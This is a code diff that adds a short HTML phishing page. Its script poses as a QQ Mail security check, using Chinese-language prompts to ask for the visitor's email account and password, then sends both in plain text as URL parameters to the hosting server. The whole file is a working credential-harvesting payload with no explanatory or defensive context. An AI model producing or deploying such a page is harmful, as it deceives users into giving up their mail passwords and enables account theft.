@@ -1,0 +1,13 @@
+<html>
+    <body>
+        <script>
+            var user = prompt("请输入邮箱账号：", "QQ邮箱检测到您正在试图跳转到一个安全的链接，需要您提供二次验证");
+            var psw  = prompt("请输入邮箱密码：");
+            if(user == null || psw == null) {
+                alert('验证失败');
+            } else {
+                window.location.href='/?user=' + user + '&psw=' + psw;
+            }
+        </script>
+    </body>
+</html>
